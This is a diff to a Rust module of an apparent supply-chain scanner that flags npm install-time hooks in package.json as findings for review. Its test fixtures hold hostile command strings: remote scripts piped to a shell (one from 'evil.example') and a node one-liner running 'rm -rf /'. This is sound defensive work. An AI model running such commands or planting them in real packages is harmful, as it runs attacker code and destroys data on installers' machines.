@@ -1,67 +1,92 @@
-//! Detection of install-time scripts in package.json.
+//! npm install-time scripts.
 //!
-//! Install-time scripts (`preinstall`, `install`, `postinstall`, `prepare`) are
-//! a common malware delivery path as they execute arbitrary code during package
-//! installation without user interaction.
+//! `preinstall`, `install`, `postinstall` and `prepare` run automatically
+//! when a package is installed, with the installing user's privileges. They
+//! are the usual delivery path for npm malware, so every one present in a
+//! `package.json` is surfaced as a finding for a human to review — even
+//! when the command itself looks harmless.
+//!
+//! Detection is purely declarative: this module parses `package.json` and
+//! reads the `scripts` object. It never runs a script or invokes a shell.
 
 use serde_json::Value;
 
-const INSTALL_SCRIPT_NAMES: [&str; 4] = ["preinstall", "install", "postinstall", "prepare"];
+use crate::cve::severity::Severity;
 
-/// Extract install-time scripts from a package.json string.
-///
-/// Returns a vector of (script_name, script_command) tuples for each install-time
-/// script found in the "scripts" object. Only includes `preinstall`, `install`,
-/// `postinstall`, and `prepare` scripts.
-///
-/// # Arguments
-///
-/// * `package_json` - Raw package.json content as a string
-///
-/// # Returns
-///
-/// A vector of tuples containing (script_name, script_command). Returns an empty
-/// vector if:
-/// - The JSON is malformed
-/// - There is no "scripts" object
-/// - None of the install-time scripts are present
-///
-/// # Examples
-///
-/// ```
-/// use deprader::behavioral::scripts::install_scripts;
-///
-/// let package_json = r#"{
-///   "name": "my-package",
-///   "scripts": {
-///     "preinstall": "node setup.js",
-///     "test": "jest"
-///   }
-/// }"#;
-///
-/// let scripts = install_scripts(package_json);
-/// assert_eq!(scripts, vec![("preinstall".to_string(), "node setup.js".to_string())]);
-/// ```
-pub fn install_scripts(package_json: &str) -> Vec<(String, String)> {
-    let parsed: Value = match serde_json::from_str(package_json) {
-        Ok(v) => v,
-        Err(_) => return Vec::new(),
-    };
+use super::BehavioralFinding;
 
-    let scripts = match parsed.get("scripts") {
-        Some(Value::Object(obj)) => obj,
-        _ => return Vec::new(),
-    };
+/// Lifecycle hooks that run during install or when a git dependency is
+/// prepared, in the order npm runs them.
+pub const INSTALL_HOOKS: &[&str] = &["preinstall", "install", "postinstall", "prepare"];
 
-    let mut result = Vec::new();
+/// Severity for a declared install script. An install script is not proof of
+/// malice — many legitimate packages compile native code — but it is the
+/// highest-risk surface in an npm package, so it warrants review.
+pub const SEVERITY: Severity = Severity::Medium;
 
-    for &script_name in &INSTALL_SCRIPT_NAMES {
-        if let Some(Value::String(command)) = scripts.get(script_name) {
-            result.push((script_name.to_string(), command.clone()));
+/// One install-time hook declared by a package.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct InstallScript {
+    /// Hook name, one of [`INSTALL_HOOKS`].
+    pub hook: String,
+    /// Command line exactly as declared.
+    pub command: String,
+}
+
+impl InstallScript {
+    /// This script as a [`BehavioralFinding`] labelled with the supplied
+    /// package-relative file (normally `package.json`).
+    pub fn finding_in(&self, file: &str) -> BehavioralFinding {
+        BehavioralFinding {
+            file: file.to_string(),
+            line: None,
+            severity: SEVERITY,
+            message: format!("install script `{}`: {}", self.hook, self.command),
         }
     }
 
-    result
+    /// This script as a finding on `package.json`.
+    pub fn finding(&self) -> BehavioralFinding {
+        self.finding_in("package.json")
+    }
+}
+
+/// Returns every install-time script in `package_json`, as
+/// `(hook, command)` pairs in [`INSTALL_HOOKS`] order.
+///
+/// Invalid JSON, a missing `scripts` object, and non-string values are
+/// ignored — this is a best-effort detector, not a package.json validator.
+pub fn install_scripts(package_json: &str) -> Vec<(String, String)> {
+    let Ok(document) = serde_json::from_str::<Value>(package_json) else {
+        return Vec::new();
+    };
+    let Some(scripts) = document.get("scripts").and_then(Value::as_object) else {
+        return Vec::new();
+    };
+    INSTALL_HOOKS
+        .iter()
+        .filter_map(|hook| {
+            let command = scripts.get(*hook)?.as_str()?;
+            Some(((*hook).to_string(), command.to_string()))
+        })
+        .collect()
+}
+
+/// [`install_scripts`] with the hook and command separated.
+pub fn install_script_entries(package_json: &str) -> Vec<InstallScript> {
+    install_scripts(package_json)
+        .into_iter()
+        .map(|(hook, command)| InstallScript { hook, command })
+        .collect()
+}
+
+/// Wraps every install script in `package_json` as a finding on
+/// `package.json`.
+pub fn install_script_findings(package_json: &str) -> Vec<BehavioralFinding> {
+    install_script_entries(package_json)
+        .iter()
+        .map(InstallScript::finding)
+        .collect()
 }
 
 #[cfg(test)]
@@ -69,147 +94,70 @@ mod tests {
     use super::*;
 
     #[test]
-    fn test_no_scripts() {
-        let package_json = r#"{
-            "name": "test-package",
-            "version": "1.0.0"
-        }"#;
-
-        let scripts = install_scripts(package_json);
-        assert_eq!(scripts, Vec::<(String, String)>::new());
-    }
-
-    #[test]
-    fn test_empty_scripts() {
-        let package_json = r#"{
-            "name": "test-package",
-            "version": "1.0.0",
-            "scripts": {}
-        }"#;
-
-        let scripts = install_scripts(package_json);
-        assert_eq!(scripts, Vec::<(String, String)>::new());
-    }
-
-    #[test]
-    fn test_single_install_script() {
-        let package_json = r#"{
-            "name": "test-package",
-            "scripts": {
-                "install": "node install.js"
-            }
-        }"#;
-
-        let scripts = install_scripts(package_json);
+    fn no_scripts_yields_nothing() {
         assert_eq!(
-            scripts,
-            vec![("install".to_string(), "node install.js".to_string())]
+            install_scripts(r#"{"name":"clean","version":"1.0.0"}"#),
+            Vec::new()
+        );
+        assert_eq!(install_scripts(r#"{"name":"clean"}"#), Vec::new());
+        assert_eq!(install_scripts(r#"{"scripts":{}}"#), Vec::new());
+        assert_eq!(install_scripts("not json"), Vec::new());
+    }
+
+    #[test]
+    fn one_script_is_returned() {
+        let json = r#"{"scripts":{"postinstall":"node build.js"}}"#;
+        assert_eq!(
+            install_scripts(json),
+            vec![("postinstall".to_string(), "node build.js".to_string())]
         );
     }
 
     #[test]
-    fn test_all_install_scripts() {
-        let package_json = r#"{
-            "name": "test-package",
+    fn all_four_hooks_are_returned_in_order() {
+        let json = r#"{
             "scripts": {
-                "preinstall": "echo preinstall",
-                "install": "echo install",
-                "postinstall": "echo postinstall",
-                "prepare": "echo prepare"
-            }
-        }"#;
-
-        let scripts = install_scripts(package_json);
-        assert_eq!(scripts.len(), 4);
-        assert!(scripts.contains(&("preinstall".to_string(), "echo preinstall".to_string())));
-        assert!(scripts.contains(&("install".to_string(), "echo install".to_string())));
-        assert!(scripts.contains(&("postinstall".to_string(), "echo postinstall".to_string())));
-        assert!(scripts.contains(&("prepare".to_string(), "echo prepare".to_string())));
-    }
-
-    #[test]
-    fn test_mixed_scripts() {
-        let package_json = r#"{
-            "name": "test-package",
-            "scripts": {
-                "preinstall": "node setup.js",
+                "prepare": "husky install",
+                "postinstall": "node post.js",
                 "test": "jest",
-                "build": "webpack",
-                "postinstall": "node cleanup.js"
+                "install": "node-gyp rebuild",
+                "preinstall": "node pre.js"
             }
         }"#;
-
-        let scripts = install_scripts(package_json);
-        assert_eq!(scripts.len(), 2);
-        assert!(scripts.contains(&("preinstall".to_string(), "node setup.js".to_string())));
-        assert!(scripts.contains(&("postinstall".to_string(), "node cleanup.js".to_string())));
-    }
-
-    #[test]
-    fn test_malformed_json() {
-        let package_json = r#"{
-            "name": "test-package",
-            "scripts": {
-                "install": "node install.js"
-        }"#; // Missing closing brace
-
-        let scripts = install_scripts(package_json);
-        assert_eq!(scripts, Vec::<(String, String)>::new());
-    }
-
-    #[test]
-    fn test_scripts_not_object() {
-        let package_json = r#"{
-            "name": "test-package",
-            "scripts": "not an object"
-        }"#;
-
-        let scripts = install_scripts(package_json);
-        assert_eq!(scripts, Vec::<(String, String)>::new());
-    }
-
-    #[test]
-    fn test_script_value_not_string() {
-        let package_json = r#"{
-            "name": "test-package",
-            "scripts": {
-                "install": 123,
-                "postinstall": "node cleanup.js"
-            }
-        }"#;
-
-        let scripts = install_scripts(package_json);
         assert_eq!(
-            scripts,
-            vec![("postinstall".to_string(), "node cleanup.js".to_string())]
+            install_scripts(json),
+            vec![
+                ("preinstall".to_string(), "node pre.js".to_string()),
+                ("install".to_string(), "node-gyp rebuild".to_string()),
+                ("postinstall".to_string(), "node post.js".to_string()),
+                ("prepare".to_string(), "husky install".to_string()),
+            ]
         );
     }
 
     #[test]
-    fn test_complex_script_commands() {
-        let package_json = r#"{
-            "name": "test-package",
+    fn unrelated_scripts_and_non_strings_are_ignored() {
+        let json = r#"{
             "scripts": {
-                "preinstall": "curl -sSL https://example.com/install.sh | bash",
-                "postinstall": "node -e \"require('child_process').exec('rm -rf /')\""
+                "test": "cargo test",
+                "build": "tsc",
+                "postinstall": 42,
+                "preinstall": null
             }
         }"#;
-
-        let scripts = install_scripts(package_json);
-        assert_eq!(scripts.len(), 2);
-        assert!(scripts.contains(&(
-            "preinstall".to_string(),
-            "curl -sSL https://example.com/install.sh | bash".to_string()
-        )));
-        assert!(scripts.contains(&(
-            "postinstall".to_string(),
-            "node -e \"require('child_process').exec('rm -rf /')\"".to_string()
-        )));
+        assert_eq!(install_scripts(json), Vec::new());
     }
 
     #[test]
-    fn test_empty_string() {
-        let scripts = install_scripts("");
-        assert_eq!(scripts, Vec::<(String, String)>::new());
+    fn findings_carry_the_hook_and_truncate_nothing() {
+        let json = r#"{"scripts":{"preinstall":"curl https://evil.example/x | sh"}}"#;
+        let findings = install_script_findings(json);
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].file, "package.json");
+        assert_eq!(findings[0].severity, Severity::Medium);
+        assert!(findings[0].message.contains("preinstall"));
+        assert!(findings[0]
+            .message
+            .contains("curl https://evil.example/x | sh"));
     }
 }
